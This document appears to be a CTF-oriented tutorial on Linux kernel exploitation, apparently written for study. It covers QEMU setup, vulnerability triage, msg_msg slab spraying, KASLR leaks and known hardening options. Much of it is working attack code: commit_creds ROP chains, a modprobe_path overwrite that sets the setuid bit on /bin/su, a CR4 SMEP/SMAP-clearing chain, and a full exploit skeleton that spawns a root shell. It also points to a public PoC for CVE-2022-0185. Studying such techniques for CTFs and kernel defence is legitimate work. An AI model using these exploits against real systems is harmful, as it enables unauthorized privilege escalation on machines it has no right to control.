# Kernel Pwn (Kernel Pwn)

## Environment Setup

Typical kernel challenge package:

```text
kernel/
├── bzImage          # compressed kernel image
├── vmlinux          # uncompressed kernel (with symbols, for gdb)
├── initramfs.cpio.gz / rootfs.img
├── vuln.ko          # vulnerable driver
├── run.sh           # qemu launch script
└── (.config)        # build config, optional
```

### Unpacking initramfs and modifying the init script

```bash
mkdir initramfs && cd initramfs
zcat ../initramfs.cpio.gz | cpio -idm
# or newc format:
# cpio -idm < ../initramfs.cpio

# edit init to get root (for CTF learning; real challenges usually setuid 1000)
sed -i 's|setuidgid 1000|setuidgid 0|g' init
# or comment out the line that switches the user

# repack
find . | cpio -o --format=newc | gzip > ../initramfs.cpio.gz
cd ..
```

### Extracting vmlinux (if only bzImage is provided)

```bash
# use the extract-vmlinux script (kernel source scripts/)
/usr/src/linux/scripts/extract-vmlinux ./bzImage > vmlinux
```

### QEMU launch argument template

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 256M \
    -kernel ./bzImage \
    -initrd ./initramfs.cpio.gz \
    -cpu kvm64,+smep,+smap \
    -append "console=ttyS0 nokaslr quiet oops=panic panic=1" \
    -monitor /dev/null \
    -nographic \
    -no-reboot \
    -s    # opens the gdb port 1234
```

Protections corresponding to the key arguments:

| Argument | Meaning | Impact on exploitation |
|------|------|---------|
| `+smep` | Kernel mode cannot execute user-mode code | Must use ROP, cannot jump to user-mode shellcode |
| `+smap` | Kernel mode cannot access user-mode data | The rop chain cannot be placed in user mode, it must be in kernel space (heap spray / msgsnd) |
| `+pku` | Protection Keys | Similar to SMAP |
| `nokaslr` | Disables KASLR | Function addresses are fixed |
| `kaslr` | Enables KASLR | Leak required |
| `pti=on` | KPTI (Meltdown mitigation) | Returning to user mode requires swapgs_restore_regs_and_return_to_usermode |

### Debugging

```bash
# terminal 1
./run.sh   # with -s

# terminal 2
gdb vmlinux
(gdb) target remote :1234
(gdb) b vulnerable_ioctl
(gdb) c
```

For GEF, the fork maintained by bata24 is recommended; it ships dedicated pretty-printers for kernel structs.

## Vulnerability triage

| Vulnerability | Typical source | Exploitation baseline |
|------|---------|---------|
| Kernel stack overflow | Controllable copy_from_user length | Stack canary + KASLR → ROP |
| Kernel heap overflow | Out-of-bounds write into a kmalloc slab | Slab spray + overwrite of adjacent objects |
| UAF | refcount bug / double free | Reallocate from the same slab → control the freed object |
| Integer overflow | Size computation overflow → small allocation, large copy | Effectively an overflow, same as above |
| TOCTOU | User-mode pointer dereferenced a second time | userfaultfd / FUSE to stretch the timing |
| race | Two threads issuing ioctls concurrently | Hit the timing window |
| Arbitrary read/write | Already the ultimate primitive | Directly overwrite cred / modprobe_path |

## Slab spraying (the core of heap pwn)

Spray kernel objects of a controllable size into the vulnerable slab to overwrite the target object.

| slab size | Spray object | Advantage |
|-----------|---------|------|
| kmalloc-64 / 96 | `seq_operations` | Has function pointers, overwriting one gives IP control |
| kmalloc-1024 | `tty_struct` | Has an ops pointer, a beautifully laid-out struct |
| kmalloc-4096 | `pipe_buffer` | The workhorse on modern kernels, still valid on 6.x |
| Any size | `msg_msg` | Controllable size (8 - 4096+), sysv msgsnd controls the data |
| kmalloc-128 | `user_key_payload` | The keyctl family of interfaces |

### msg_msg spray example

```c
// User-mode trigger
int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

struct {
    long mtype;
    char mtext[0x80 - 0x30];  // plus the msg_msg header 0x30 = kmalloc-128
} msg = { .mtype = 0x1337 };
memset(msg.mtext, 'A', sizeof(msg.mtext));

msgsnd(msqid, &msg, sizeof(msg.mtext), 0);   // sprays into kmalloc-128
// ... trigger the vulnerability to overwrite
msgrcv(msqid, &msg, sizeof(msg.mtext), 0, 0); // read back to see whether it was modified → leak
```

## Privilege escalation paths

### 1. commit_creds(prepare_kernel_cred(0)) ROP

Classic and universally applicable. Prerequisite: control of RIP (stack overflow / vtable hijack).

```c
// User-mode ROP chain
uint64_t rop[] = {
    pop_rdi,                          // pop rdi; ret
    0,                                // arg: 0
    prepare_kernel_cred,              // → returns a root cred in rax
    pop_rdi,                          // pop rdi; ret
    /* placeholder; the mov below overwrites it */ 0,
    /* mov rdi, rax; ... ; ret */ 0,  // moves rax→rdi (some kernels need a dedicated gadget)
    commit_creds,                     // sets the current process cred = root
    swapgs_restore_regs_and_return_to_usermode + 22,  // skip the push sequence
    0, 0,                             // rax, rdi placeholders
    user_rip,                         // user-mode return function (cs/ss already saved)
    user_cs, user_rflags, user_rsp, user_ss,
};
```

**Key gadgets** (find them in vmlinux with ROPgadget):

```bash
ROPgadget --binary vmlinux --only "pop|ret" | grep 'pop rdi'
ROPgadget --binary vmlinux --only "mov|ret" | grep 'mov rdi, rax'
```

cs/ss/rflags/rsp must be saved before returning to user mode:

```c
void save_state() {
    __asm__(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp));
}
void shell() { system("/bin/sh"); }
```

### 2. Overwriting modprobe_path with /tmp/x (least effort)

```text
How it works:
  - The kernel global variable modprobe_path defaults to "/sbin/modprobe"
  - When execve runs a file whose magic is unrecognized, the kernel invokes modprobe_path with root privileges
  - Change it to "/tmp/x", write /tmp/x (chmod +x), and trigger execution of the unknown magic
  
Applies when: you have an arbitrary write primitive, but not necessarily ROP
```

```c
// 1. Prepare the payload
system("echo -e '#!/bin/sh\nchmod +s /bin/su' > /tmp/x");
system("chmod +x /tmp/x");

// 2. Prepare the trigger file
system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/trigger");
system("chmod +x /tmp/trigger");

// 3. Vulnerability write: change modprobe_path to "/tmp/x\x00"
arbitrary_write(modprobe_path_addr, "/tmp/x\x00");

// 4. Trigger
system("/tmp/trigger");
// The kernel runs /tmp/x as root, which does chmod +s /bin/su

// 5. Abuse the setuid bit
system("/bin/su");
```

**Where the modprobe_path address comes from**: the symbol in vmlinux, or /proc/kallsyms (if kptr_restrict=0).

### 3. core_pattern hijack

```text
Similar idea: /proc/sys/kernel/core_pattern controls the coredump handler
Change it to "|/tmp/x %P" so it gets invoked when a process crashes
Downside: requires triggering a coredump, clunkier than modprobe_path
```

### 4. Using kernel ROP to disable SMEP/SMAP

If you really want to jump back to user-mode shellcode (for learning purposes), you can use ROP to clear the cr4 bits:

```c
// CR4: SMEP = bit 20, SMAP = bit 21
// Only after SMEP+SMAP are cleared can a jmp to user-mode shellcode run
uint64_t rop[] = {
    pop_rdi,
    0x6f0,                  // desired CR4 value (SMEP/SMAP bits removed)
    mov_cr4_rdi,            // something like "mov cr4, rdi; pop rbp; ret"
    0,
    user_shellcode_addr,    // jump there (this step fails if SMEP is not yet disabled)
};
```

In practice, **real-world exploits almost never take this path** — a direct commit_creds ROP is shorter and more reliable.

## KASLR leak channels

| Source | Limitation | Notes |
|------|------|------|
| /proc/kallsyms | Real addresses only when `kptr_restrict=0` | Often open in CTF |
| /sys/module/.../sections/.text | Same as above | Module base address |
| dmesg | Readable only when `dmesg_restrict=0` | oops messages leak addresses |
| Uninitialized kernel stack read | The bug itself must allow an arbitrary read | Leftover addresses |
| msg_msg + vulnerability leak | OOB read after spraying | Universal |
| Side channels (Meltdown/Spectre) | KPTI fixed Meltdown | Not universal |
| SIDT/SGDT user-mode instructions | May leak on old kernels | Essentially closed on modern kernels |

```c
// Classic: read from /proc/kallsyms
FILE *f = fopen("/proc/kallsyms", "r");
char line[256];
unsigned long commit_creds = 0;
while (fgets(line, sizeof(line), f)) {
    if (strstr(line, " commit_creds")) {
        commit_creds = strtoul(line, NULL, 16);
        break;
    }
}
unsigned long kbase = commit_creds - 0xXXXXX;  // offset from vmlinux
```

## Full exploit template (user mode + ioctl trigger + ROP privesc + shell)

```c
// exploit.c — generic kernel pwn skeleton
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

static unsigned long user_cs, user_ss, user_rflags, user_rsp;

static void save_state(void) {
    __asm__ volatile(
        "movq %%cs,   %0\n"
        "movq %%ss,   %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp,  %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        :: "memory");
}

static void win(void) {
    if (getuid() == 0) {
        puts("[+] root!");
        system("/bin/sh");
    } else {
        puts("[-] not root");
    }
    exit(0);
}

// === KASLR base (leak first, or hardcode directly under nokaslr) ===
#define KBASE_DEFAULT  0xffffffff81000000UL
#define OFF_COMMIT_CREDS         0x0xxxxx
#define OFF_PREPARE_KERNEL_CRED  0x0xxxxx
#define OFF_POP_RDI              0x0xxxxx
#define OFF_MOV_RDI_RAX          0x0xxxxx
#define OFF_SWAPGS_RESTORE       0x0xxxxx

int main(void) {
    save_state();

    // 1. Leak the KASLR base (this assumes /proc/kallsyms is readable, or write your own leak primitive)
    unsigned long kbase = leak_kbase();

    unsigned long prepare_kernel_cred = kbase + OFF_PREPARE_KERNEL_CRED;
    unsigned long commit_creds        = kbase + OFF_COMMIT_CREDS;
    unsigned long pop_rdi             = kbase + OFF_POP_RDI;
    unsigned long mov_rdi_rax         = kbase + OFF_MOV_RDI_RAX;
    unsigned long swapgs_restore      = kbase + OFF_SWAPGS_RESTORE + 22;

    // 2. Build the ROP chain (on the user stack or on a sprayed fake stack)
    unsigned long *rop = mmap((void*)0x100000, 0x1000,
                              PROT_READ|PROT_WRITE,
                              MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0);
    int i = 0;
    rop[i++] = pop_rdi;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = mov_rdi_rax;
    rop[i++] = commit_creds;
    rop[i++] = swapgs_restore;
    rop[i++] = 0;  // rax
    rop[i++] = 0;  // rdi
    rop[i++] = (unsigned long)win;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = (unsigned long)(rop + 100);  // temporary user rsp, can point high into the mmap region
    rop[i++] = user_ss;

    // 3. Trigger the vulnerability so kernel RIP jumps to rop[0]
    int fd = open("/dev/vuln", O_RDWR);
    trigger(fd, rop);   // challenge-specific: ioctl / write / read

    return 0;
}
```

## Study reference: CVE-2022-0185

```text
Vulnerability: signed/unsigned confusion in the length computation of legacy_parse_param in fs/fs_context.c
      → kmalloc heap buffer overflow, size fully controllable, data fully controllable

Why it is a good study sample:
1. No root required to trigger (unprivileged user namespace)
2. The overflow size is fully controllable
3. A complete public writeup + PoC exists
4. It combines: user_ns exploitation, msg_msg spraying, reallocation after UAF, cross-cache attacks

Study path:
1. Build a kernel with CONFIG_USER_NS=y
2. Run the original Crusaders of Rust PoC: https://www.openwall.com/lists/oss-security/2022/01/18/7
3. Read the official writeup on willsroot.io (the version featured by PortSwigger)
4. Rewrite it manually: turn the msg_msg spray into a pipe_buffer spray version (to practice a different slab path)
5. Add a KASLR leak (the original uses /proc/kallsyms; once the challenge build disables it, switch to OOB read)
```

The main techniques map to sections of this document:

- Vulnerability type → "Kernel heap overflow"
- Spray object → "msg_msg spray"
- Privilege escalation method → "commit_creds ROP" or "modprobe_path"
- KASLR leak → "/proc/kallsyms" or "msg_msg + vulnerability leak"

## Caveats

- **CONFIG_RANDOM_KSTACK_OFFSET / RANDOMIZE_KSTACK_OFFSET_DEFAULT** shifts the kernel stack base by a random 0-1023 on every syscall, affecting every exploit that depends on fixed stack offsets
- **CONFIG_SLAB_FREELIST_RANDOM / HARDENED** randomizes object allocation within slabs, lowering spray success rates — spray more
- **CONFIG_STATIC_USERMODEHELPER** turns modprobe_path into the read-only `static_usermodehelper_path`, killing the modprobe attack
- **KPTI** separates user-mode/kernel-mode page tables; returning to user mode must go through the `swapgs_restore_regs_and_return_to_usermode` trampoline, a direct swapgs+iretq will not work
- **FG-KASLR** (function-granular KASLR) randomizes at function granularity, so you must leak multiple symbols to derive each function's offset
- **CET / IBT** (Intel control-flow enforcement) forces indirect jumps to land on ENDBR instructions, invalidating some gadgets
- **Do not test by calling printk inside the kernel** — serial IO changes timing and breaks races; debug with a magic register value (rcx=0xdeadbeef) + gdb watch
